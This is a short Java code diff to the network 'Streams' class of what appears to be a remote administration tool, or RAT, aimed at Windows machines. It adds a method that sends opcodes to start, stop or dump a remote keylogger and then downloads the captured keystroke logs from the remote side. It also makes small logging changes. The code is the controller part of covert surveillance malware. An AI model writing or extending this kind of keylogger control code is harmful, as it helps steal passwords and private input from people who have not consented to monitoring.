@@ -1,10 +1,12 @@
 package Connections;
 
 
+import GUI.TableUtils.KeyLogger.KeyloggerEvents;
 import Information.SystemInformation;
 import Information.NetworkInformation;
 import Information.Action;
 
+import com.sun.jna.platform.win32.COM.IStream;
 import org.json.JSONObject;
 
 
@@ -65,9 +67,11 @@ public class Streams {
         File filePath = new File(path + "\\" + fileName);
         filePath.getParentFile().mkdirs();
 
-        filePath.createNewFile();
+        boolean resultOfCreation = filePath.createNewFile();
 
+        System.out.println(resultOfCreation);
         System.out.println("Name " + filePath);
+
         sendSize(-70);
         int fileSize = readSize();
         int read;
@@ -236,6 +240,16 @@ public class Streams {
         }
     }
 
+    public void sendAndReadJSON(KeyloggerEvents event) throws IOException {
+        switch (event) {
+            case START -> sendSize(12);
+            case STOP -> sendSize(13);
+            case DUMP -> {
+                sendSize(14);
+                receiveFile("KeyLogger Logs");
+            }
+        }
+    }
 
     public void sendList(List<String> fileList) throws IOException {
         for (String file : fileList) {
@@ -331,4 +345,6 @@ public class Streams {
     public DataInputStream getDis() {
         return dis;
     }
+
+
 }
